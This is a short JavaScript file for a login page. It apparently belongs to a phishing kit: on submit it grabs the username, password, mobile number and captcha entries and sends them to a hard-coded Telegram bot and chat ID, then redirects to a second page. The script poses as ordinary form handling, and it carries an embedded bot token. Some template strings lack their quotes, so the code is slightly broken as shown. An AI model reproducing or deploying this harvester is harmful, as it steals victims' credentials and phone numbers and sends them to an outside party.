(function() {
    // Mobile number input: allow only 10 digits
    document.getElementById('mobile-number').addEventListener('input', function(event) {
        const input = event.target;
        input.value = input.value.replace(/\D/g, '').slice(0, 10); // Allow only digits and limit to 10 digits
    });

    // Form submission
    document.getElementById('login-form').addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent default form submission

        // Collect form values
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const mobileNumber = document.getElementById('mobile-number').value;
        const captchaText = document.getElementById('captcha-text').value;
        const captchaOption = document.querySelector('input[name="captcha-option"]:checked').value;

        // Check if mobile number is exactly 10 digits
        if (mobileNumber.length === 10) {
            // Prepare message to be sent via Telegram bot
            const telegramMessage = Username: ${username}, Password: ${password}, Mobile Number: ${mobileNumber}, Captcha Text: ${captchaText}, Captcha Option: ${captchaOption};

            // Send data to Telegram bot
            fetch(https://api.telegram.org/bot5916172934:AAEI03cl0921Tw3R7RtlLsf4122uqYiunSU/sendMessage, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: '1554295324', // Your Telegram chat ID
                    text: telegramMessage
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('Message sent successfully to Telegram:', data);
                    // On success, redirect to the second page
                    window.location.href = '2page.html'; // Redirect after successful submission
                } else {
                    console.error('Failed to send message to Telegram:', data);
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
        } else {
            console.error('Mobile number must be exactly 10 digits.');
        }
    });
})();
 
   
